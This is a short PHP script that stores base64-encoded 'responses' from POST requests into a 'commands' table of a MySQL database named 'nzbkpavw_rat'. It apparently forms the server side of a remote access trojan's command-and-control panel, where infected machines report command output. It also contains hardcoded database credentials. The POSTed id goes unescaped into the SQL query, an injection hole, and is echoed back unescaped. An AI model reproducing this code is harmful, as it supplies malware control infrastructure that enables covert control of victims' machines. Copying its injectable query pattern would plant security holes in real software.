<?php

mysql_connect("localhost", "nzbkpavw_rat", "pq97r") or die(mysql_error());
mysql_select_db("nzbkpavw_rat") or die(mysql_error());

$response = "";
$id = "";
if (isset($_POST['response'])) $response = base64_encode($_POST['response']);
if (isset($_POST['id'])) $id =  $_POST['id'];
echo $_POST['id'];
if ($response != "") {
	mysql_query("UPDATE commands SET response='$response' WHERE id='$id'") or die(mysql_error());
}

?>